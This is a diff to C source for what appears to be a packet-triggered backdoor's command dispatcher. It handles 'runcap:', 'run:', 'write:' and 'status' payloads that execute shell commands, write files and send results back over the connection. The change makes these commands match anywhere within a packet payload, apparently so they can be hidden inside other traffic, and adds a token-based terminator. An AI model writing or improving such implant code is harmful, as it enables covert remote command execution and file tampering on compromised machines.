@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -382,27 +383,39 @@ static void dispatch(char *payload, int payload_len, unsigned char *buf,
     struct reply_ctx ctx = { buf, ifindex, sport, dport,
                              is_tcp, tcp_seq, tcp_ack, {0}, 0 };
 
-    if (payload_len >= 7 && !strncmp(payload, "runcap:", 7)) {
-        char *rest = payload + 7;
-        int rest_len = payload_len - 7;
+    char *match;
+    if ((match = memmem(payload, payload_len, "runcap:", 7))) {
+        int off = match - payload;
+        char *rest = match + 7;
+        int rest_len = payload_len - off - 7;
         char *colon = memchr(rest, ':', rest_len);
         if (colon && colon - rest > 0 && colon - rest < (int)sizeof(ctx.token)) {
             ctx.token_len = colon - rest;
             memcpy(ctx.token, rest, ctx.token_len);
             ctx.token[ctx.token_len] = '\0';
-            rest = colon + 1;
+            char *cmd = colon + 1;
+            int cmd_max = rest_len - (colon - rest) - 1;
+            char end_mark[18];
+            end_mark[0] = ':';
+            memcpy(end_mark + 1, ctx.token, ctx.token_len);
+            char *cmd_end = memmem(cmd, cmd_max, end_mark, 1 + ctx.token_len);
+            if (cmd_end)
+                *cmd_end = '\0';
+            run_captured(cmd, &ctx);
         }
-        run_captured(rest, &ctx);
-    } else if (payload_len >= 4 && !strncmp(payload, "run:", 4))
-        run_detached(payload + 4);
-    else if (payload_len >= 8 && !strncmp(payload, "write:", 6))
-        handle_write(payload + 6, payload_len - 6);
-    else if (payload_len >= 6 && !strncmp(payload, "status", 6)) {
-        if (payload_len > 7 && payload[6] == ':') {
-            int tlen = payload_len - 7;
+    } else if ((match = memmem(payload, payload_len, "run:", 4)))
+        run_detached(match + 4);
+    else if ((match = memmem(payload, payload_len, "write:", 6))) {
+        int off = match - payload;
+        handle_write(match + 6, payload_len - off - 6);
+    } else if ((match = memmem(payload, payload_len, "status", 6))) {
+        int off = match - payload;
+        int remaining = payload_len - off;
+        if (remaining > 7 && match[6] == ':') {
+            int tlen = remaining - 7;
             if (tlen > 0 && tlen < (int)sizeof(ctx.token)) {
                 ctx.token_len = tlen;
-                memcpy(ctx.token, payload + 7, tlen);
+                memcpy(ctx.token, match + 7, tlen);
                 ctx.token[tlen] = '\0';
             }
         }
